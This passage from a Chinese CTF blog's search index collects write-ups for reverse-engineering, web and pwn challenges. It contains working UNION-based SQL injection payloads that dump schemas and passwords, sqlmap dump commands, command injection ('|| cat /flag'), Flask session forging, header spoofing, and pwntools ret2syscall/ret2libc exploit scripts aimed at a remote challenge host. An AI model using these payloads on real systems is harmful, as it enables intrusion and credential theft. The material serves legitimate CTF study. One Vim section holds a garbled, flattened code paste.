0; j < strlen(Arglist); ++j )\n    Arglist[j] ^= 0x30u;\n  v7 = strcmp(Arglist, \"c~scvdzKCEoDEZ[^roDICUMC\");\n  if ( v7 )\n    v7 = v7 < 0 ? -1 : 1;\n  if ( !v7 )\n  {\n    sub_401020(\"yes\", v9);\n    exit(0);\n  }\n  sub_401020(\"error\", v9);\n  exit(0);\n}\n```\n\n我们分析代码就可以知道，我们已知了加密后的代码，先异或回数据，然后根据前面的替换\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3qj9ibdwap80.webp)\n\n然后根据上面解出来的数据再写代码进行替换位置\n\n``` python\na='SNCSFTJ{su_tujknB_tyse}s'\nsecret=list(a)\n\nfor i in range(0,12):\n  deme=secret[2*i+1]\n  secret[2*i+1] = secret[2*i]\n  secret[2*i]=deme\n\nresult=''.join(secret)\n\nprint(result,end='')\n\n# NSSCTF{Just_junk_Bytess}\n```\n\n\n\n## [SWPUCTF 2021 新生赛]easyapp\n\n\n\n首先先把附件改成zip后缀进行解压，解压完成后直接使用jadx打开直接找到主函数进行分析\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5lfec6bnq680.webp)\n\n我们可以看到这段是主要的函数\n\n``` java\npublic /* synthetic */ void lambda$onCreate$0$MainActivity(final EditText editText, View v) {\n        System.out.println(encoder.encode(editText.getText().toString()));\n        if (encoder.encode(editText.getText().toString()).equals(\"棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌\")) {\n            Toast.makeText(this, \"YES\", 0).show();\n        } else {\n            Toast.makeText(this, \"NO\", 0).show();\n        }\n\n```\n\n前面引进了两个函数，我们挨个查看一下\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1cftb7q0szxc.webp)\n\n我们可以看到第一个加密函数，使用了key为123456789，然后和输入的内容进行异或\n\n``` java\npackage com.example.ilililililil;\n\n/* loaded from: classes.dex */\npublic class Encoder {\n    private int key = 123456789;\n\n    public String encode(String str) {\n        StringBuilder sb = new StringBuilder();\n        for (char c : str.toCharArray()) {\n            sb.append((char) (c ^ this.key));\n        }\n        return sb.toString();\n    }\n}\n```\n\n我们看一下下一个函数。这里就是一个坑，他把第一个函数中的key值改成了987654321，所以后面异或的key为987654321\n\n``` java\npackage com.example.ilililililil;\n\nimport java.lang.reflect.Field;\n\n/* loaded from: classes.dex */\npublic class MainActlvity {\n    public MainActlvity() {\n        try {\n            Field declaredField = Encoder.class.getDeclaredField(\"key\");\n            declaredField.setAccessible(true);\n            declaredField.set(MainActivity.encoder, 987654321);\n        } catch (IllegalAccessException | NoSuchFieldException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\n到现在我们已经知道了异或的key以及密文，所以我们就可以直接写脚本解题目了\n\n当然注意一个很关键的地方因为他的apk使用的unicode编码，但我们ascii码的表示范围是0x0-0xFF，所以到最后我们需要异或一个255或者0xff表示范围\n\n``` python\ncode='棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌'\nkey = 987654321\nflag=\"\"\nfor i in code:\n  flag+=chr((ord(i)^key)%128) #确定在0~128\nprint(flag)\n\n# NSSCTF{apkYYDS}\n```\n\n","tags":["ctf","re"]},{"title":"web入门记录","url":"/2023/09/21/web入门记录/","content":"\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg)\n\n\n\n<!-- more --> \n\n## SQL注入\n\n[SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/116484328)\n\n[浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客]()\n\n\n\nSQL中的select语句，select语句是SQL中的查询语句，用于从数据库中查询数据，并且返回给用户。\n它的简单用法是这样的：**select 字段名1,字段名2...字段名n from** 表名当然，你也可以同时指定数据库名及表名，具体用法是用一个点号连接数据库名和表名，例子：select 字段名1,字段名2...字段名n from 数据库名.表名\n\n联合查询：\n\t格式：**select 字段名1,字段名2...字段名n from 表名1 union select 字段名1,字段名2...字段名n from 表名2**\n\t作用：联合查询用于合并两个或多个 SELECT 语句的结果集\n\t注意：\n\n\t\t1. 每个 SELECT 语句必须拥有相同数量的列\n\t\t2. 列必须拥有相似的数据类型（相似的意思是：有些数据类型间可以互相转化，比如数字字符串和数字。这就叫相似，相似就行，不是必须一模一样）\n\t\t3. 每个 SELECT 语句中的列的顺序必须相同\n\n## 手注：\n\n记录一种做题方法\n\n题目来源 Litctf sql注入\n\n1.先判断显示位，payload\n\n``` php\n-1)))))) union select 1,2#\n```\n\n2.爆库：\n\n```php+HTML\n1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#\n```\n\n1=2的目的是使得条件为假\n\n3.得到库名\n\n```php\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\n4.爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctf\"#\n```\n\n5.得到表名：\n\n```php\nusers\n```\n\n6.爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"users\"#\n```\n\n7.得到列名：\n\n```php\nid,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password\n```\n\n8.获取值：\n\n```\n1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#\n```\n\n9.获得彩蛋（难蚌）：\n\n```php\nOHHHHHHH,F1rst_to_Th3_eggggggggg!} \n```\n\nflag同理，去爆ctftraining即可\n\n10.重新爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctftraining\"#\n```\n\n11.得到表明：\n\n```php\nflag,news,users\n```\n\n12.重新爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"flag\"#\n```\n\n13.获得列名：\n\n```\nflag\n```\n\n14.重新获取值：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag#\n```\n\n## Sqlmap\n\n查询是否可以找到数据库\n\n``` \npython3 sqlmap.py -r 1.txt\n```\n\n查数据库\n\n``` \npython3 sqlmap.py -r 1.txt -dbs --batch\n```\n\n查表\n\n``` \npython3 sqlmap.py -r 1.txt -D school -tables --batch\n```\n\n查字段\n\n``` \npython3 sqlmap.py -r 1.txt  -D school -T students --columns --batch\n```\n\n查数据\n\n``` \npython3 sqlmap.py -r 1.txt  -D school -T students -C name --dump --batch\n```\n\n当请求延时的时候使用--delay 1\n\n``` \npython3 sqlmap.py -r 1.txt -dbs --batch --delay 1\n```\n\n\n\n## 反序列化\n\n\n\n## session伪造\n\n\n\n\n\n## md5弱比较，强比较\n\n知识点：[【PHP】MD5比较漏洞 弱比较、强比较、强碰撞_md5字符串qnkcdzo与s_小 白 萝 卜的博客-CSDN博客](https://blog.csdn.net/EC_Carrot/article/details/109525162#:~:text=弱比较 if(%24_POST['a']!%3D%24_POST['b']%26%26,md5(%24_POST['a'])%3D%3Dmd5(%24_POST['b'])){ die(\"success!\")%3B })\n\n[CTF中的md5弱类型（ALL_IN_ONE）_ctf all in one_OceanSec的博客-CSDN博客](https://blog.csdn.net/q20010619/article/details/109856150)\n\n\n\n例题：[[NSSCTF 2022 Spring Recruit\\]babyphp | NSSCTF](https://www.nssctf.cn/problem/2076)\n\n源码：\n\n``` php\n <?php\nhighlight_file(__FILE__);\ninclude_once('flag.php');\nif(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){\n    if(isset($_POST['b1'])&&$_POST['b2']){\n        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){\n            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){\n                echo $flag;\n            }else{\n                echo \"yee\";\n            }\n        }else{\n            echo \"nop\";\n        }\n    }else{\n        echo \"go on\";\n    }\n}else{\n    echo \"let's get some php\";\n}\n?> \n```\n\n我们可以看到他一共是有三层比较，我们需要一层一层的绕过\n\n第一层的意思是\n\n- \"a\" 字段存在。\n- \"a\" 字段的值不包含数字字符。\n- \"a\" 字段的值可以转换为一个非零的整数。\n  \n\n我们就可以使用数组的形式，来绕过他的判断，数组的hash他是不会输出hash值的，所以不管什么值都是真确\n\n第二层就是输入b1和b2，进行md5强比较\n\n也可以直接使用数组的方式绕过\n\n第三层是md5弱比较，我们直接采用那些字符转换md5会变成0e开头的就可以了\n\n![image-20230923170343632](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6gwbpclsays0.webp)\n","tags":["ctf","Web"]},{"title":"litctf","url":"/2023/09/19/litctf/","content":"\n# web\n\n## [LitCTF 2023]我Flag呢？\n\n打开环境后，直接F12就可以看到flag\n\n同时打开源码的方式还有\n\n``` \nf12/ctrl+u/view-source：\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/{4038CD4C-5AD6-45cc-B79F-734765D74244}.74m3u0jfzps0.webp)\n\n<!-- more --> \n\n## [LitCTF 2023]PHP是世界上最好的语言！！\n\n打开页面，猜测命令执行\n\nsystem(\"ls /\"); 查看目录文件夹，看到flag文件直接查看即可\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4m4th4lnkqg0.png)\n\n\n\n## [LitCTF 2023]就当无事发生\n\n首先去探姬的github，然后直接搜索他的博客地址\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/0bc762429c6478832b423983f5f49c8e.2fr8flw6sa80.webp)\n\n随后直接点击这个按钮，可以查看作者对文件的更改\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2r551bvk57c0.webp)\n\n最后在里面找到带有X号的，就是作者删除过的，或者点上面的√可以看到作者的更改\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/{7E1532FA-9E7A-4e87-A5FE-C4EB552A98AF}.112w5kxubstc.webp)\n\n\n\n## [LitCTF 2023]Follow me and hack me\n\n直接hackar进行传参\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/8160496c03f53fa83615d0212465ef11.12lqjzm7lqf4.webp)\n\n\n\n## [LitCTF 2023]Vim yyds\n\nxxxxxxxxxx mappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }nums = []keys = open('usbdata.txt')for line in keys:    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':         continue    nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums:    if n == 0 :        continue    if n in mappings:        output += mappings[n]    else:        output += '[unknown]'print('output :\\n' + output)​# output :# SEC2ETK3YPython\n\n``` \nvim -r xxx.swp\n```\n\n比如我 vim 1.php 但是我中通关闭了他，那天就会产生这个文件，只需要r一下就可以恢复\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/15250cfd706242cbaf0aa0e5a8f97bab.67gq0p6qvn40.webp)\n\n回到题目，首先下载下这个文件，然后去kali将文件恢复\n\n``` \nnode4.anna.nssctf.cn:28647/.index.php.swp\n```\n\n此时我们就已知了他的php代码\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6pidz6qpuog0.webp)\n\n代码的逻辑很简单，就是post传参一个base64加密后的'Give_Me_You_Flag'\n\n然后传入一个名为cmd的参数，因为外包裹着eval，所以我们可以执行命令\n\n可以用burp进行抓包操作得到flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.28caqntwhedc.webp)\n\n\n\n## [LitCTF 2023]这是什么？SQL ！注一下 ！\n\n[SQL注入攻击原理，方法和类型_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1ZR4y1Y745/?spm_id_from=333.880.my_history.page.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18)\n\n[SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客](https://blog.csdn.net/A951860555/article/details/116484328)\n\n作为一个新手web，看了一天，看不懂一点，所以直接记套题，后续慢慢了解\n\n但我可以解释一下每个命令的作用\n\n首先先id=1，先判断是字符型注入还是整形注入\n\nid=1回显就是整形\n\nid=’1‘回显就是字符型\n\n可以看到id=1时有回显，我们判断他是整形注入\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2pssl53e6kq0.webp)\n\n\n\n[浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客](https://blog.csdn.net/qq_23667585/article/details/127213099)\n\n1.先判断显示位，payload\n\n``` php\n-1)))))) union select 1,2#\n```\n\n第一句就有很多问题，详细可以参考上述的文章，wp参考\n\n[[LitCTF2023\\] web方向全题解wp_Leafzzz__的博客-CSDN博客](https://blog.csdn.net/Leaf_initial/article/details/130671885)\n\n2.爆库：\n\n```php+HTML\n1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#\n```\n\n1=2的目的是使得条件为假,经过我的实验使用id=-1)))))) union...同理，所以这俩的作用都是表示判断错误，不显示第一个数据库，显示第二个\n\n3.得到库名\n\n```php\ninformation_schema,mysql,ctftraining,performance_schema,test,ctf\n```\n\n4.爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctf\"#\n```\n\n5.得到表名：\n\n```php\nusers\n```\n\n6.爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"users\"#\n```\n\n7.得到列名：\n\n```php\nid,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password\n```\n\n8.获取值：\n\n```\n1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#\n```\n\n9.获得彩蛋（难蚌）：\n\n```php\nOHHHHHHH,F1rst_to_Th3_eggggggggg!} \n```\n\nflag同理，去爆ctftraining即可\n\n10.重新爆表：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(table_name)from information_schema.tables where table_schema=\"ctftraining\"#\n```\n\n11.得到表明：\n\n```php\nflag,news,users\n```\n\n12.重新爆列：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(column_name)from information_schema.columns where table_name=\"flag\"#\n```\n\n13.获得列名：\n\n```\nflag\n```\n\n14.重新获取值：\n\n```php\n1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag#\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2vs4use82qa0.webp)\n\n\n\n#### webshell：需要上传木马以及蚁剑的使用\n\n大马，小马，一句话木马等，上传后使用蚁剑进行连接\n\n[如何使用中国蚁剑连接webshell？_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1Wk4y1m7fp/?spm_id_from=333.337.search-card.all.click&vd_source=c195ba0f6cdc7f783321bd952f37fd18)\n\n## [LitCTF 2023]Http pro max plus\n\n和http请求头有关的题目，详细可以在下面的网站了解\n\n[HTTP 标头（header） - HTTP | MDN (mozilla.org)](https://developer.mozilla.org/zh-CN/docs/web/http/headers)\n\n``` php\nX-Forwarded: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nForwarded-For: 127.0.0.1\nForwarded: 127.0.0.1\nX-Requested-With: 127.0.0.1\nX-Forwarded-Proto: 127.0.0.1\nX-Forwarded-Host: 127.0.0.1\nX-remote-IP: 127.0.0.1\nX-remote-addr: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\nClient-IP: 127.0.0.1\nX-Real-IP: 127.0.0.1\nAli-CDN-Real-IP: 127.0.0.1\nCdn-Src-Ip: 127.0.0.1\nCdn-Real-Ip: 127.0.0.1\nCF-Connecting-IP: 127.0.0.1\nX-Cluster-Client-IP: 127.0.0.1\nWL-Proxy-Client-IP: 127.0.0.1\nProxy-Client-IP: 127.0.0.1\nFastly-Client-Ip: 127.0.0.1\nTrue-Client-Ip: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Host: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\n```\n\n本机地址client-ip: 127.0.0.1\n\n访问网站referer: pornhub.com\n\n指定浏览器user-agent: Chrome\n\n使用代理via: Clash.win\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.73yrqln52y00.webp)\n\n\n\n到达这个页面后，直接去源码查看就可以看到flag所在的地方\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xfl93ctnwu0.webp)\n\n\n\n## [LitCTF 2023]1zjs\n\n直接去源代码区域，找到js源码，可以发现一个php，里面有很多jsfuck的文字，直接去解密就行\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1rcn1dvd618g.webp)\n\n因为是js，可以在控制台直接输出\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4yqn0mb2fi00.webp)\n\n\n\n## [LitCTF 2023]Flag点击就送！\n\nsession伪造的题目\n\n我们可以先尝试输入文字然后回车，到后面获取flag，然后他提示我们需要管理员才能获取flag\n\n通过burp抓包我们可以看到有一段cookie被返回，题目的要求是只有管理员才能拿flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.61623zag7co0.png)\n\nsession伪造需要一个key，一般的题目中key是需要在题目中找的，但是这个题目的key是猜的，key='litctf'\n\n``` python\n解码：python3  flask_session_cookie_manager3.py decode -s \"密钥\" -c \"session\"\n\n加密：python3  flask_session_cookie_manager3.py encode -s \"密钥\" -t \"上面解密出的一串字符串\"\n```\n\n我们获取了key后可以先去解密一下，我们发现解密后他的请求name为'111',根据题目我们修改成'admin'，就可以了\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.27nvnjo9nyo0.webp)\n\n我们使用burp发送过去就可以获得flag\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2eee9dgxxog0.webp)\n\n## [LitCTF 2023]Ping\n\n我们首先可以看到源码，里面有个正则\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.64n0c8tf0240.webp)\n\n所以我们有两个方式，第一个就是直接禁用JavaScript即可\n\nF12+F1 禁用后直接 1.1.1.1 || （ls /）(cat /flag) 即可\n\n同时这里就涉及了一个知识点就是linux的管道命令\n\n``` \n&  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &\n\n&& 表示前一条命令执行成功时，才执行后一条命令 ，如 echo '1‘ && echo '2'    \n\n| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo 'yes' | wc -l\n\n|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo \"fail\"\n```\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7fx5n2h64yo0.webp)\n\n第二个方法就是使用burp进行抓包，抓到后之间在内部进行修改\n\n![](https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1g5mkbhr9g5c.webp)\n","tags":["ctf","Pwn","RE","litctf","WEB"]},{"title":"山石结营赛","url":"/2023/08/20/山石结营赛/","content":"\n## ret2syscall\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64', os='linux', log_level='debug')\n\n# p = process('pwn')\np = remote('58.240.236.231',49003)\n\n\nrdi = 0x40072b\nrsi = 0x400735\nrax = 0x400721\nsyscall = 0x400741\nrdx = 0x40073f\nbinsh = 0x601048\npayload = 0x48*b'a'+ p64(rax) + p64(59) + p64(rdi) + p64(0x601048) + p64(rsi) + p64(0) + p64(syscall)\np.sendline(payload)\np.interactive()\n```\n\n<!-- more --> \n\n## ret2libc\n\n\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\n\ncontext(arch='amd64', os='linux')\ncontext.log_level = 'debug'\n\n# p = remote(\"58.240.236.231\",49002)\n\np = process('./pwn123')\n\nelf = ELF('./pwn123')\n\ngot_addr = elf.got['puts']\n\nplt_addr = elf.plt['puts']\n\nmain_addr = elf.symbols['vul']\n\nprint(hex(main_addr))\n\npop_rdi = 0x0000000000400783\n\npop_rsi_r15 = 0x0000000000400781\n\npayload = b'a'*0xD8 + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)\n# print(payload)\n\np.sendline(payload)\n\n# p.recvuntil('OK,Good!')\n\nputs_addr=u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) #将其中的前6个字节（因为这里用的是Little Endian字节序）转换成unsigned long long类型的整数，\n\nprint(hex(puts_addr))\n\nlibc = LibcSearcher(\"puts\",puts_addr)\n\nlibcsase = puts_addr - libc.dump(\"puts\") \n\nsystem_addr = libcsase + libc.dump(\"system\")\n\nbinsh_addr = libcsase + libc.dump(\"str_bin_sh\")\n\nret_addr = 0x0000000000400509\n\npayload2 = b'a'*0xD8 + p64(ret_addr) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)\n\np.sendline(payload2)\n\np.interactive()\n```\n\n\n\n## git\n\n\n\n```Shell\n  ?is=flag&flag=flag\n```\n\n\n\n## HSAndroid1\n\n\n\n```python\nflag_chars = list(\"0db530c0e9752357b1ae4cf7ea8331ae\")\n\nfor i in range(14, 0, -2):\n    for j in range(12, 0, -4):\n        temp = flag_chars[j]\n        flag_chars[j] = flag_chars[j - 4]\n        flag_chars[j - 4] = temp\n    j2 = i - 1\n    temp2 = flag_chars[j2]\n    flag_chars[i - 1] = flag_chars[i - 2]\n    flag_chars[i - 2] = temp2\n\nflag = \"\".join(flag_chars)\nprint(\"Decrypted Flag:\", flag)\n```\n\n\n\n## easyusb\n\n\n\n```shell\ntshark -T json -r usb.pcapng > test.json \n```\n\n提取流量包，类似这种格式\n\n```C\nusbhid.data\": \"00:00:16:00:00:00:00:00\"\n```\n\n```c\n00:00:16:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:08:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:06:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:1f:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:08:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:17:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:0e:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:20:00:00:00:00:00\n00:00:00:00:00:00:00:00\n00:00:1c:00:00:00:00:00\n00:00:00:00:00:00:00:00\n```\n\n\n\n\n\n然后网上找脚本一把嗦\n\n```Python\nmappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\nnums = []\nkeys = open('usbdata.txt')\nfor line in keys:\n    if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0':\n         continue\n    nums.append(int(line[6:8],16))\nkeys.close()\noutput = \"\"\nfor n in nums:\n    if n == 0 :\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\nprint('output :\\n' + output)\n\n# output :\n# SEC2ETK3Y\n```\n","tags":["ctf","pwn","write up"]}]